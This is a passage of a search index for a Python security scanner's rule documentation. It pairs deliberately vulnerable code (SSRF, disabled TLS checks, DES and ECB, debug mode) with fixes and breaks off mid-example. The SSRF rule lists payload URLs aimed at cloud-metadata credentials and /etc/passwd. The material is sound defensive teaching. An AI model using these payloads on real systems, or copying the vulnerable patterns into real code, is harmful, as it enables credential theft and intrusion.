Hashing","text":"<p>Never store passwords directly. Use a library like <code>passlib</code> or Python's built-in <code>hashlib.scrypt</code> or <code>hashlib.pbkdf2_hmac</code> which are designed for this purpose.</p> <pre><code>import hashlib\nimport os\n\npassword = b\"my-super-secret-password\"\nsalt = os.urandom(16) # A new random salt should be generated for each password\n\n# Use scrypt, a password-based key derivation function\nhashed_password = hashlib.scrypt(\n    password,\n    salt=salt,\n    n=16384, # CPU/memory cost factor\n    r=8,     # Block size\n    p=1      # Parallelization factor\n)\n\n# Store the salt along with the hash\n</code></pre>"},{"location":"rule/CSP-D301/#when-is-md5-acceptable","title":"When is MD5 acceptable?","text":"<p>MD5 is only acceptable for non-cryptographic purposes, such as a key in a hash table or as a quick, non-security-related checksum for detecting accidental data corruption. If the goal is to protect against malicious tampering, MD5 is not sufficient.</p>"},{"location":"rule/CSP-D301/#how-to-suppress-a-finding","title":"How to Suppress a Finding","text":"<p>If you are using MD5 for a valid, non-security-related purpose, you can suppress the finding.</p> <pre><code>import hashlib\n\n# This hash is used as a non-security cache key.\n# ignore\ncache_key = hashlib.md5(data).hexdigest()\n</code></pre> <p>Or, for this specific rule:</p> <pre><code># ignore: CSP-D301\ncache_key = hashlib.md5(data).hexdigest()\n</code></pre>"},{"location":"rule/CSP-D302/","title":"CSP-D302: Use of Weak SHA-1 Hashing Algorithm","text":"<p>Vulnerability Category: <code>Cryptography</code></p> <p>Severity: <code>MEDIUM</code></p>"},{"location":"rule/CSP-D302/#description","title":"Description","text":"<p>This rule flags the use of the SHA-1 (Secure Hash Algorithm 1) hashing algorithm. While once a standard for data integrity and digital signatures, SHA-1 is now considered insecure for cryptographic purposes.</p> <p>In 2017, researchers demonstrated the first practical collision attack against SHA-1, meaning they were able to create two different files with the same SHA-1 hash. This makes SHA-1 unsuitable for any security-sensitive application where collision resistance is important.</p> <p>SHA-1 should not be used for: - Digital signatures - Password storage - Data integrity checks in security contexts</p>"},{"location":"rule/CSP-D302/#vulnerable-code-example","title":"Vulnerable Code Example","text":"<pre><code>import hashlib\n\ndata = b\"This data should be secure.\"\n\n# Using SHA-1 is no longer considered safe for cryptographic purposes.\n# An attacker could potentially create a different piece of data with the same hash.\nhashed_data = hashlib.sha1(data).hexdigest()\n\nprint(f\"SHA-1 Hash: {hashed_data}\")\n</code></pre>"},{"location":"rule/CSP-D302/#safe-code-example","title":"Safe Code Example","text":"<p>Use a modern, strong hashing algorithm from the SHA-2 or SHA-3 family, such as SHA-256 or SHA-512.</p>"},{"location":"rule/CSP-D302/#for-general-hashing-data-integrity","title":"For General Hashing (Data Integrity)","text":"<pre><code>import hashlib\n\ndata = b\"This data should be secure.\"\n\n# Use SHA-256 for a secure hash that is resistant to collisions.\nhashed_data = hashlib.sha256(data).hexdigest()\n\nprint(f\"SHA-256 Hash: {hashed_data}\")\n</code></pre>"},{"location":"rule/CSP-D302/#for-password-hashing","title":"For Password Hashing","text":"<p>As with MD5, SHA-1 is not suitable for password storage. Use a dedicated password-based key derivation function like <code>scrypt</code> or <code>PBKDF2</code>, which incorporates salts and is computationally intensive. See CSP-D301 for a password hashing example.</p>"},{"location":"rule/CSP-D302/#is-sha-1-ever-acceptable","title":"Is SHA-1 ever acceptable?","text":"<p>The use of SHA-1 is strongly discouraged. Its only potentially acceptable use case is in legacy protocols where it is required for backward compatibility. Even in these cases, it is critical to understand the risks and to plan for an upgrade. For new applications, SHA-1 should not be used.</p> <p>HMAC-SHA1 is generally considered safe as it is not directly vulnerable to collision attacks, but migrating to HMAC-SHA256 is still the recommended best practice.</p>"},{"location":"rule/CSP-D302/#how-to-suppress-a-finding","title":"How to Suppress a Finding","text":"<p>If you are required to use SHA-1 for compatibility with a legacy system and have assessed the risks, you can suppress the finding.</p> <pre><code>import hashlib\n\n# This is required for a legacy API compatibility.\n# ignore\nlegacy_hash = hashlib.sha1(data).hexdigest()\n</code></pre> <p>Or, for this specific rule:</p> <pre><code># ignore: CSP-D302\nlegacy_hash = hashlib.sha1(data).hexdigest()\n</code></pre>"},{"location":"rule/CSP-D304/","title":"CSP-D304: Use of Insecure Cryptographic Ciphers","text":"<p>Vulnerability Category: <code>Cryptography</code></p> <p>Severity: <code>HIGH</code></p>"},{"location":"rule/CSP-D304/#description","title":"Description","text":"<p>This rule flags the use of weak or broken symmetric encryption ciphers. Using outdated ciphers can expose sensitive data to decryption by an attacker. Modern computing power and advances in cryptanalysis have rendered many older algorithms insecure.</p> <p>This rule specifically targets the use of: - DES (Data Encryption Standard): Has a small 56-bit key size, making it vulnerable to brute-force attacks. - Triple DES (3DES): While more secure than DES, it is slow and has known vulnerabilities. - RC2, RC4 (ARC4): Have been found to have several cryptographic weaknesses and biases that can be exploited. - Blowfish: Suffers from a small 64-bit block size, making it vulnerable to attacks on large amounts of data.</p> <p>For all new applications, AES (Advanced Encryption Standard) is the recommended and industry-standard symmetric cipher.</p>"},{"location":"rule/CSP-D304/#vulnerable-code-example-pycryptodome-with-des","title":"Vulnerable Code Example (pycryptodome with DES)","text":"<pre><code>from Crypto.Cipher import DES\nfrom Crypto.Random import get_random_bytes\n\nkey = get_random_bytes(8) # DES uses a 64-bit (8 byte) key, but only 56 bits are effective\ncipher = DES.new(key, DES.MODE_ECB)\ndata = b'secret data to be hidden'\n\n# Pad data to be a multiple of 8 bytes\npadded_data = data + b' ' * (8 - len(data) % 8)\n\nencrypted_data = cipher.encrypt(padded_data)\n\nprint(f\"Encrypted: {encrypted_data.hex()}\")\n</code></pre>"},{"location":"rule/CSP-D304/#safe-code-example-pycryptodome-with-aes","title":"Safe Code Example (pycryptodome with AES)","text":"<p>Use AES with a secure mode of operation like GCM, which provides both confidentiality and authenticity.</p> <pre><code>from Crypto.Cipher import AES\nfrom Crypto.Random import get_random_bytes\n\nkey = get_random_bytes(16) # AES-128 uses a 16-byte key\ncipher = AES.new(key, AES.MODE_GCM)\n\ndata = b'secret data to be hidden'\n\nencrypted_data, tag = cipher.encrypt_and_digest(data)\n\n# You must store or transmit the nonce and the tag along with the ciphertext\n# nonce = cipher.nonce\n# tag = tag\n\nprint(f\"Encrypted: {encrypted_data.hex()}\")\nprint(f\"Tag: {tag.hex()}\")\nprint(f\"Nonce: {cipher.nonce.hex()}\")\n\n# ... later, to decrypt ...\n# a_cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)\n# decrypted_data = a_cipher.decrypt_and_verify(encrypted_data, tag)\n</code></pre>"},{"location":"rule/CSP-D304/#how-to-suppress-a-finding","title":"How to Suppress a Finding","text":"<p>Using a weak cipher is highly discouraged. Suppression should only be considered if you are required to interact with a legacy system that cannot be upgraded.</p> <pre><code>from Crypto.Cipher import DES\n\n# This is required for compatibility with a legacy hardware device.\n# The risk has been assessed and accepted.\n# ignore\ncipher = DES.new(legacy_key, DES.MODE_ECB)\n</code></pre> <p>Or, for this specific rule:</p> <pre><code># ignore: CSP-D304\ncipher = DES.new(legacy_key, DES.MODE_ECB)\n</code></pre>"},{"location":"rule/CSP-D305/","title":"CSP-D305: Use of Insecure Cipher Mode (ECB)","text":"<p>Vulnerability Category: <code>Cryptography</code></p> <p>Severity: <code>MEDIUM</code></p>"},{"location":"rule/CSP-D305/#description","title":"Description","text":"<p>This rule flags the use of the Electronic Codebook (ECB) mode for symmetric encryption. Even when used with a strong cipher like AES, ECB mode is insecure because it encrypts identical blocks of plaintext into identical blocks of ciphertext. This means that patterns in the plaintext are preserved in the ciphertext, which can leak significant information about the original data.</p> <p>An attacker can analyze the encrypted data to identify patterns, which may help them to infer the content of the message. This is famously illustrated by the \"ECB penguin\" image, where the encrypted image of a penguin is still clearly recognizable.</p>"},{"location":"rule/CSP-D305/#vulnerable-code-example","title":"Vulnerable Code Example","text":"<p><pre><code>from Crypto.Cipher import AES\n\nkey = b'Sixteen byte key' # 16 bytes = 128 bits\ncipher = AES.new(key, AES.MODE_ECB) # Using ECB mode is insecure\n\n# A message with a repeating pattern\ndata = b'ATTACK ATTACK ATTACK ATTACK'\n\nencrypted_data = cipher.encrypt(data)\n\n# The encrypted data will also have a repeating pattern, leaking information.\nprint(f\"Encrypted: {encrypted_data.hex()}\")\n</code></pre> In the example above, the ciphertext for each \"ATTACK\" block will be identical.</p>"},{"location":"rule/CSP-D305/#safe-code-example","title":"Safe Code Example","text":"<p>Use a secure mode of operation that provides confidentiality and, ideally, authenticity. Recommended modes include: - GCM (Galois/Counter Mode): Provides authenticated encryption (AEAD), ensuring both confidentiality and integrity. This is often the best choice. - CBC (Cipher Block Chaining): A widely used mode that chains blocks together, but requires careful handling of Initialization Vectors (IVs) and padding. It does not provide integrity protection on its own.</p>"},{"location":"rule/CSP-D305/#safe-example-with-gcm","title":"Safe Example with GCM","text":"<pre><code>from Crypto.Cipher import AES\nfrom Crypto.Random import get_random_bytes\n\nkey = get_random_bytes(16)\ndata = b'ATTACK ATTACK ATTACK ATTACK'\n\n# GCM is a modern, secure, and recommended mode.\ncipher = AES.new(key, AES.MODE_GCM)\nencrypted_data, tag = cipher.encrypt_and_digest(data)\nnonce = cipher.nonce\n\n# The resulting ciphertext will not have a discernible pattern.\nprint(f\"Encrypted: {encrypted_data.hex()}\")\n\n# To decrypt, the nonce and tag are required, which protects against tampering.\n# a_cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)\n# decrypted_data = a_cipher.decrypt_and_verify(encrypted_data, tag)\n</code></pre>"},{"location":"rule/CSP-D305/#how-to-suppress-a-finding","title":"How to Suppress a Finding","text":"<p>Using ECB mode is strongly discouraged. It should only be used if required for compatibility with a legacy system that cannot be changed, and only if the data being encrypted has no discernible patterns.</p> <pre><code>from Crypto.Cipher import AES\n\n# Required for a legacy system. The data is known to be random and has no patterns.\n# The risks have been fully assessed.\n# ignore\ncipher = AES.new(legacy_key, AES.MODE_ECB)\n</code></pre> <p>Or, for this specific rule:</p> <pre><code># ignore: CSP-D305\ncipher = AES.new(legacy_key, AES.MODE_ECB)\n</code></pre>"},{"location":"rule/CSP-D311/","title":"CSP-D311: Use of a Weak Pseudo-Random Number Generator (PRNG)","text":"<p>Vulnerability Category: <code>Cryptography</code></p> <p>Severity: <code>LOW</code></p>"},{"location":"rule/CSP-D311/#description","title":"Description","text":"<p>This rule flags the use of Python's <code>random</code> module for generating random numbers in a security-sensitive context. The <code>random</code> module implements a pseudo-random number generator (specifically, the Mersenne Twister), which is perfectly suitable for modeling, simulation, and other non-cryptographic tasks.</p> <p>However, it is not cryptographically secure. Its output is predictable; if an attacker can learn the internal state of the generator, they can predict all future (and past) random numbers. This makes it unsuitable for any security purpose, such as: - Generating passwords, session tokens, or other credentials. - Generating cryptographic keys or nonces. - Creating salts for password hashing. - Any part of an authentication or authorization mechanism.</p>"},{"location":"rule/CSP-D311/#vulnerable-code-example","title":"Vulnerable Code Example","text":"<pre><code>import random\nimport string\n\ndef generate_reset_token(length=16):\n    # Using random.choice is not secure for generating tokens.\n    # An attacker could potentially predict the token.\n    chars = string.ascii_letters + string.digits\n    return ''.join(random.choice(chars) for _ in range(length))\n\nprint(f\"Insecure reset token: {generate_reset_token()}\")\n</code></pre>"},{"location":"rule/CSP-D311/#safe-code-example","title":"Safe Code Example","text":"<p>For any security-related need for randomness, use the <code>secrets</code> module, which was introduced in Python 3.6. The <code>secrets</code> module uses the operating system's most secure source of randomness (<code>os.urandom()</code> on most systems) and is designed specifically for cryptographic use.</p> <pre><code>import secrets\nimport string\n\ndef generate_secure_reset_token(length=16):\n    # secrets.choice is cryptographically secure.\n    chars = string.ascii_letters + string.digits\n    return ''.join(secrets.choice(chars) for _ in range(length))\n\nprint(f\"Secure reset token: {generate_secure_reset_token()}\")\n\n# For generating a URL-safe text string (e.g., for tokens)\nsecure_token = secrets.token_urlsafe(16) # Creates a 16-byte random token\nprint(f\"URL-safe token: {secure_token}\")\n</code></pre> <p>For generating raw random bytes (e.g., for cryptographic keys), you can use <code>os.urandom()</code> or <code>secrets.token_bytes()</code>.</p> <pre><code>import os\nimport secrets\n\n# Both of these are secure ways to get random bytes.\nkey1 = os.urandom(16)\nkey2 = secrets.token_bytes(16)\n</code></pre>"},{"location":"rule/CSP-D311/#how-to-suppress-a-finding","title":"How to Suppress a Finding","text":"<p>You should only suppress this finding if you are confident the use of the <code>random</code> module is for a non-security purpose.</p> <pre><code>import random\n\n# This is for a simulation, not for security.\n# ignore\nrandom_value = random.randint(1, 100)\n</code></pre> <p>Or, for this specific rule:</p> <pre><code># ignore: CSP-D311\nrandom_value = random.random()\n</code></pre>"},{"location":"rule/CSP-D401/","title":"CSP-D401: Insecure TLS/SSL Certificate Verification Disabled","text":"<p>Vulnerability Category: <code>Network</code></p> <p>Severity: <code>HIGH</code></p>"},{"location":"rule/CSP-D401/#description","title":"Description","text":"<p>This rule flags the use of <code>verify=False</code> in calls made with the <code>requests</code> library. The <code>requests</code> library is a popular tool for making HTTP requests in Python. By default, it verifies the SSL/TLS certificate of the server it is communicating with to ensure you are connecting to the correct server and that the connection is encrypted.</p> <p>Setting <code>verify=False</code> disables this validation. This makes the connection vulnerable to Man-in-the-Middle (MITM) attacks. An attacker on the same network could intercept the request, impersonate the server, and then read or modify any data sent, including sensitive information like passwords, API keys, or personal data.</p>"},{"location":"rule/CSP-D401/#vulnerable-code-example","title":"Vulnerable Code Example","text":"<p><pre><code>import requests\n\napi_key = \"my-secret-key\"\nuser_data = {\"name\": \"alice\", \"email\": \"alice@example.com\"}\n\ntry:\n    # Disabling verification makes this connection insecure.\n    response = requests.post(\n        \"https://api.example.com/data\",\n        json=user_data,\n        headers={\"Authorization\": f\"Bearer {api_key}\"},\n        verify=False\n    )\n    print(\"Data sent successfully.\")\nexcept requests.exceptions.RequestException as e:\n    print(f\"An error occurred: {e}\")\n</code></pre> In this example, an attacker could intercept the connection, steal the <code>api_key</code>, and read the <code>user_data</code>.</p>"},{"location":"rule/CSP-D401/#safe-code-example","title":"Safe Code Example","text":"<p>The safest approach is to always leave <code>verify</code> at its default value of <code>True</code>.</p> <pre><code>import requests\n\napi_key = \"my-secret-key\"\nuser_data = {\"name\": \"alice\", \"email\": \"alice@example.com\"}\n\ntry:\n    # With verify=True (the default), requests will validate the certificate.\n    response = requests.post(\n        \"https://api.example.com/data\",\n        json=user_data,\n        headers={\"Authorization\": f\"Bearer {api_key}\"}\n    )\n    response.raise_for_status() # Raise an exception for bad status codes\n    print(\"Data sent successfully.\")\nexcept requests.exceptions.RequestException as e:\n    print(f\"An error occurred: {e}\")\n</code></pre>"},{"location":"rule/CSP-D401/#dealing-with-self-signed-certificates","title":"Dealing with Self-Signed Certificates","text":"<p>In development or when connecting to internal systems, you might encounter self-signed certificates. Instead of using <code>verify=False</code>, you should provide the path to the certificate authority (CA) bundle or the self-signed certificate file.</p> <pre><code>import requests\n\n# Provide the path to your custom CA bundle or certificate file.\nresponse = requests.get(\"https://internal.service.local\", verify=\"/path/to/my/ca.crt\")\n</code></pre>"},{"location":"rule/CSP-D401/#how-to-suppress-a-finding","title":"How to Suppress a Finding","text":"<p>Suppressing this finding is strongly discouraged. It should only be done if you are connecting to a non-sensitive, local resource where MITM attacks are not a concern, and you have no other way to validate the connection.</p> <pre><code>import requests\n\n# This is a local development server with no sensitive data.\n# The risk has been assessed.\n# ignore\nresponse = requests.get(\"https://localhost:8443/status\", verify=False)\n</code></pre> <p>Or, for this specific rule:</p> <pre><code># ignore: CSP-D401\nresponse = requests.get(\"https://localhost:8443/status\", verify=False)\n</code></pre>"},{"location":"rule/CSP-D402/","title":"CSP-D402: Server-Side Request Forgery (SSRF)","text":"<p>Vulnerability Category: <code>Network</code></p> <p>Severity: <code>CRITICAL</code></p>"},{"location":"rule/CSP-D402/#description","title":"Description","text":"<p>Server-Side Request Forgery (SSRF) is a vulnerability that allows an attacker to force a server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing. This can be used to pivot and attack internal, non-public services within the server's network, or to access metadata services in cloud environments (like the AWS or GCP metadata endpoints), potentially leading to a full cloud infrastructure compromise.</p> <p>This rule flags network requests made with libraries like <code>requests</code> or <code>urllib</code> where the URL is constructed from user input without proper validation.</p>"},{"location":"rule/CSP-D402/#vulnerable-code-example","title":"Vulnerable Code Example","text":"<p><pre><code>import requests\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/fetch_image')\ndef fetch_image():\n    # The URL is taken directly from a query parameter.\n    image_url = request.args.get('url')\n\n    if not image_url:\n        return \"Please provide a URL.\", 400\n\n    try:\n        # The application makes a request to the user-provided URL.\n        # This is a classic SSRF vulnerability.\n        response = requests.get(image_url, timeout=5)\n        return response.content, 200, {'Content-Type': response.headers.get('Content-Type')}\n    except requests.exceptions.RequestException as e:\n        return f\"Error fetching image: {e}\", 500\n</code></pre> An attacker could abuse this endpoint by providing URLs like: - <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code> to steal AWS credentials. - <code>http://localhost:8080/admin</code> to access an internal admin panel. - <code>file:///etc/passwd</code> to read local files on the server.</p>"},{"location":"rule/CSP-D402/#safe-code-example","title":"Safe Code Example","text":"<p>The most effective way to prevent SSRF is to use a strict allowlist of trusted domains and protocols. Never allow requests to arbitrary domains.</p> <pre><code>import requests\nfrom flask import Flask, request\nfrom urllib.parse import urlparse\n\napp = Flask(__name__)\n\n# A strict allowlist of domains the application is allowed to call.\nALLOWED_DOMAINS = {\n    'images.example.com',\n    'media.trusted-partner.org'\n}\n\n@app.route('/fetch_image')\ndef fetch_image():\n    image_url = request.args.get('url')\n\n    if not image_url:\n        return \"Please provide a URL.\", 400\n\n    try:\n        parsed_url = urlparse(image_url)\n\n        # 1. Validate the scheme\n        if parsed_url.scheme not in ('http', 'https'):\n            return \"Invalid URL scheme.\", 400\n\n        # 2. Validate the domain against the allowlist\n        if parsed_url.hostname not in ALLOWED_DOMAINS:\n            return \"Domain not allowed.\", 400\n\n        # 3. Make the request\n        response = requests.get(image_url, timeout=5)\n        return response.content, 200, {'Content-Type': response.headers.get('Content-Type')}\n    except (requests.exceptions.RequestException, ValueError) as e:\n        return f\"Error fetching image: {e}\", 500\n</code></pre> <p>For more complex scenarios, consider using a well-vetted library specifically designed to prevent SSRF, as blocklists and simple parsing can often be bypassed with clever URL encoding or DNS tricks.</p>"},{"location":"rule/CSP-D402/#how-to-suppress-a-finding","title":"How to Suppress a Finding","text":"<p>SSRF is a critical vulnerability. Suppressing it is highly discouraged. Only do so if you have implemented robust, custom validation logic that is not automatically detectable.</p> <pre><code># The 'validated_url' has been checked against a strict allowlist.\n# ignore\nresponse = requests.get(validated_url)\n</code></pre> <p>Or, for this specific rule:</p> <pre><code># ignore: CSP-D402\nresponse = requests.get(validated_url)\n</code></pre>"},{"location":"rule/CSP-D403/","title":"CSP-D403: Debug Mode Enabled in Production","text":"<p>Vulnerability Category: <code>Network</code></p> <p>Severity: <code>HIGH</code></p>"},{"location":"rule/CSP-D403/#description","title":"Description","text":"<p>This rule flags when a web application is run with debug mode enabled. Debug mode is a powerful feature in web frameworks like Flask, Django, and others, providing detailed error pages and often an interactive debugger in the browser.</p> <p>While extremely useful during development, running an application in debug mode in a production environment is a major security risk. - Information Leakage: Detailed traceback pages can reveal sensitive information about your application's structure, libraries, file paths, and configuration. - Remote Code Execution (RCE): Some frameworks (notably Flask with the Werkzeug debugger) provide an interactive web-based console on the error page. This console is often protected by a PIN, but if an attacker can guess or bypass the PIN, they can execute arbitrary Python code on the server, leading to a full system compromise.</p> <p>Debug mode should never be enabled in a production deployment.</p>"},{"location":"rule/CSP-D403/#vulnerable-code-example-flask","title":"Vulnerable Code Example (Flask)","text":"<pre><code>from flask import Flask\n\napp = Flask(__name__)\n\n@app.route('/')\ndef hello():\n    # This will cause an error\n    1 / 0\n    return \"Hello, World!\"\n\nif __name__ == '__main__':\n    # Running with debug=True exposes the interactive debugger\n    app.run(debug=True)\n</code></pre>"},{"location":"rule/CSP-D403/#vulnerable-configuration-django","title":"Vulnerable Configuration (Django)","text":"<p>In a Django <code>settings.py</code> file: <pre><code># This should always be False in production\nDEBUG = True\n</code></pre></p>"},{"location":"rule/CSP-D403/#safe-configuration","title":"Safe Configuration","text":"<p>Debug mode should be controlled by an environment variable or a configuration file that is different for development and production environments.</p>"},{"location":"rule/CSP-D403/#safe-flask-example","title":"Safe Flask Example","text":"<pre><code>from flask import Flask\nimport os\n\napp = Flask(__name__)\n\n# It's better to use a production-ready WSGI server like Gunicorn or uWSGI\n# instead of app.run() in production.\n# If you must use app.run(), ensure debug is disabled.\nif __name__ == '__main__':\n    # Get debug status from an environment variable, defaulting to False\n    is_debug = os.environ.get(\"FLASK_DEBUG\", \"false\").lower() == \"true\"\n    app.run(debug=is_debug)\n</code></pre>"},{"location":"rule/CSP-D403/#safe-django-settingspy","title":"Safe Django <code>settings.py</code>","text":"<pre><code>import os\n\n# Set DEBUG to False by default, and only enable it if an env var is explicitly set.\n# The `os.environ.get(...) != 'False'` is a robust way to handle this, as most\n# non-empty strings are True in a boolean context.\nDEBUG = os.environ.get('DJANGO_DEBUG', 'False') == 'True'\n</code></pre> <p>The standard practice is to use a production-grade WSGI server (like Gunicorn, uWSGI, or Daphne) to run your application, rather than the built-in development servers provided by the frameworks. These servers do not use the framework's debug mode.</p>"},{"location":"rule/CSP-D403/#how-to-suppress-a-finding","title":"How to Suppress a Finding","text":"<p>You should not suppress this finding for code running in a production environment. If this code is part of a development-only script, you can add a suppression comment.</p> <pre><code># This is a development startup script and will not be used in production.\n# ignore\napp.run(debug=True)\n</code></pre> <p>Or, for this specific rule:</p> <pre><code># ignore: CSP-D403\napp.run(debug=True)\n</code></pre>"},{"location":"rule/CSP-D404/","title":"CSP-D404: Service Hardcoded to Bind to All Network Interfaces","text":"<p>Vulnerability Category: <code>Network</code></p> <p>Severity: <code>MEDIUM</code></p>"},{"location":"rule/CSP-D404/#description","title":"Description","text":"<p>This rule flags network services that are hardcoded to bind to <code>0.0.0.0</code> (for IPv4) or <code>::</code> (for IPv6). Binding a server to this address makes it listen on all available network interfaces.</p> <p>While this is often necessary for services that are intended to be public (like a production web server), it can be dangerous for development servers, test harnesses, or internal tools. If a developer runs a service bound to <code>0.0.0.0</code> on their local machine, that service may become exposed to the local network. If the service is not properly secured, this could lead to unauthorized access from others on the same network.</p> <p>For services intended only for local access, they should be explicitly bound to <code>127.0.0.1</code> (localhost).</p>"},{"location":"rule/CSP-D404/#vulnerable-code-example-flask","title":"Vulnerable Code Example (Flask)","text":"<pre><code>from flask import Flask\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    return \"This is a private development server.\"\n\nif __name__ == '__main__':\n    # Binding to '0.0.0.0' makes the server accessible from the local network.\n    # If the developer is on a public Wi-Fi, this could be very dangerous.\n    app.run(host='0.0.0.0', port=8080)\n</code></pre>"},{"location":"rule/CSP-D404/#vulnerable-code-example-socket-server","title":"Vulnerable Code Example (Socket Server)","text":"<pre><code>import socket\n\n# Create a socket server\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Binding to all interfaces\nserver_socket.bind(('0.0.0.0', 9999))\nserver_socket.listen(5)\n\nprint(\"Server listening on all interfaces on port 9999...\")\n# ... server logic ...\n</code></pre>"},{"location":"rule/CSP-D404/#safe-code-example","title":"Safe Code Example","text":"<p>For local development and testing, always bind to <code>127.0.0.1</code> or <code>localhost</code>. This ensures the service is only accessible from the same machine.</p>"},{"location":"rule/CSP-D404/#safe-flask-example","title":"Safe Flask Example","text":"<pre><code>from flask import Flask\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    return \"This is a private development server.\"\n\nif __name__ == '__main__':\n    # Binding to '127.0.0.1' ensures the server is only accessible locally.\n    app.run(host='127.0.0.1', port=8080)\n</code></pre>"},{"location":"rule/CSP-D404/#safe-production-practice","title":"Safe Production Practice","text":"<p>In production, it is common to bind to <code>0.0.0.0</code> within a container. The exposure is then controlled by the container orchestration system (like Docker or Kubernetes) and the host's firewall rules. In this context, it is acceptable, but the configuration should ideally be managed via environment variables, not hardcoded.</p> <pre><code>import os\n\n# Get the host from an environment variable, defaulting to localhost.\nhost = os.environ.get('APP_HOST', '127.0.0.1')\nport = int(os.environ.get('APP_PORT', 8080))\n\napp.run(host=host, port=port)\n</code></pre>"},{"location":"rule/CSP-D404/#how-to-suppress-a-finding","title":"How to Suppress a Finding","text":"<p>If you are intentionally creating a public-facing service and have appropriate firewall rules and security controls in place, you can suppress this finding.</p> <pre><code># This is a public service and is intended to be exposed.\n# Security is handled by the cloud environment's firewall.\n# ignore\napp.run(host='0.0.0.0', port=80)\n</code></pre> <p>Or, for this specific rule:</p> <pre><code># ignore: CSP-D404\napp.run(host='0.0.0.0', port=80)\n</code></pre>"},{"location":"rule/CSP-D405/","title":"CSP-D405: Network Request Without a Timeout","text":"<p>Vulnerability Category: <code>Network</code></p> <p>Severity: <code>MEDIUM</code></p>"},{"location":"rule/CSP-D405/#description","title":"Description","text":"<p>This rule flags network requests made with libraries like <code>requests</code> or <code>urllib</code> that do not have an explicit timeout configured. By default, these libraries can wait indefinitely for a response from the server.</p> <p>If the remote server is slow, unresponsive, or malicious, a request without a timeout can cause the client application to hang. In a multi-threaded or multi-process application (like a web server), many such hanging requests can consume all available workers, leading to a Denial of Service (DoS) where the application can no longer handle new requests.</p> <p>It is a critical best practice to always set a reasonable timeout on all external network requests.</p>"},{"location":"rule/CSP-D405/#vulnerable-code-example","title":"Vulnerable Code Example","text":"<pre><code>import requests\n\ntry:\n    # This request has no timeout. If the server at 'https://api.example.com'\n    # is down or hangs, this call will block forever.\n    response = requests.get(\"https://api.example.com/data\")\n    print(\"Request successful.\")\nexcept requests.exceptions.RequestException as e:\n    print(f\"An error occurred: {e}\")\n</code></pre>"},{"location":"rule/CSP-D405/#safe-code-example","title":"Safe Code Example","text":"<p>Always provide a <code>timeout</code> argument to your request calls. The timeout can be a single float value for the entire request, or a tuple of <code>(connect_timeout, read_timeout)</code>.</p> <pre><code>import requests\n\ntry:\n    # Set a timeout of 5 seconds. If the server doesn't respond within\n    # that time, a `requests.exceptions.Timeout` exception will be raised.\n    response = requests.get(\"https://api.example.com/data\", timeout=5)\n    print(\"Request successful.\")\nexcept requests.exceptions.Timeout:\n    print(\"The request timed out.\")\nexcept requests.exceptions.RequestException as e:\n    print(f\"An error occurred: {e}\")\n</code></pre>"},{"location":"rule/CSP-D405/#connect-vs-read-timeout","title":"Connect vs. Read Timeout","text":"<p>For more granular control, you can set separate timeouts for connecting to the server and for reading the response.</p> <pre><code>import requests\n\ntry:\n    # Wait max 3.5 seconds to establish a connection, and max 10 seconds\n    # to receive the response after the connection is made.\n    response = requests.get(\n        \"https://api.example.com/large-file\",\n        timeout=(3.5, 10)\n    )\n    print(\"Request successful.\")\nexcept requests.exceptions.Timeout:\n    print(\"The request timed out.\")\n</code></pre>"},{"location":"rule/CSP-D405/#how-to-suppress-a-finding","title":"How to Suppress a Finding","text":"<p>There are very few reasons to make a request without a timeout. If you are interacting with a highly trusted, local service where timeouts are not a concern, you might suppress this. However, it is still better to set a very long timeout than no timeout at all.</p> <pre><code># This is a trusted local service that is guaranteed to be responsive.\n# ignore\nresponse = requests.get(\"http://localhost/internal-service\")\n</code></pre> <p>Or, for this specific rule:</p> <pre><code># ignore: CSP-D405\nresponse = requests.get(\"http://localhost/internal-service\")\n</code></pre>"},{"location":"rule/CSP-D406/","title":"CSP-D406: Use of Insecure FTP Protocol","text":"<p>Vulnerability Category: <code>Network</code></p> <p>Severity: <code>MEDIUM</code></p>"},{"location":"rule/CSP-D406/#description","title":"Description","text":"<p>This rule flags the use of <code>ftplib</code>, Python's library for interacting with the File Transfer Protocol (FTP). FTP is an old and insecure protocol that transmits all data, including usernames and passwords, in cleartext.</p> <p>Anyone who can monitor the network traffic between the client and the server can easily capture these credentials and gain unauthorized access to the FTP server. They can also read or modify any files being transferred.</p> <p>Due to its lack of encryption, FTP should not be used. Secure alternatives like SFTP (SSH File Transfer Protocol) or FTPS (FTP over SSL/TLS) should be used instead.</p>"},{"location":"rule/CSP-D406/#vulnerable-code-example","title":"Vulnerable Code Example","text":"<pre><code>from ftplib import FTP\n\ntry:\n    # The password 'my-secret-password' is sent in cleartext over the network.\n    ftp = FTP('ftp.example.com')\n    ftp.login('myuser', 'my-secret-password')\n\n    print(\"FTP login successful.\")\n\n    # Any files transferred will also be in cleartext.\n    with open('file.txt', 'rb') as f:\n        ftp.storbinary('STOR file.txt', f)\n\n    ftp.quit()\nexcept Exception as e:\n    print(f\"An error occurred: {e}\")\n</code></pre>"},{"location":"rule/CSP-D406/#safe-code-example","title":"Safe Code Example","text":"<p>Use a library that supports a secure file transfer protocol.</p>"},{"location":"rule/CSP-D406/#safe-example-with-sftp-paramiko","title":"Safe Example with SFTP (<code>paramiko</code>)","text":"<p>SFTP is a completely different protocol that runs over SSH and provides strong encryption and authentication.</p> <pre><code># First, install the library: pip install paramiko\nimport paramiko\n\nhostname = 'sftp.example.com'\nport = 22\nusername = 'myuser'\npassword = 'my-secret-password'\n\ntry:\n    transport = paramiko.Transport((hostname, port))\n    transport.connect(username=username, password=password)\n\n    sftp = paramiko.SFTPClient.from_transport(transport)\n\n    print(\"SFTP connection successful.\")\n\n    # The connection and file transfer are encrypted.\n    sftp.put('local_file.txt', 'remote_file.txt')\n\n    sftp.close()\n    transport.close()\nexcept Exception as e:\n    print(f\"An error occurred: {e}\")\n</code></pre>"},{"location":"rule/CSP-D406/#safe-example-with-ftps-ftplib","title":"Safe Example with FTPS (<code>ftplib</code>)","text":"<p>FTPS is an extension of FTP that adds support for TLS/SSL encryption. <code>ftplib</code> supports this via the <code>FTP_TLS</code> class.</p> <pre><code>from ftplib import FTP_TLS\n\ntry:\n    # Use FTP_TLS for an encrypted connection\n    ftps = FTP_TLS('ftps.example.com')\n    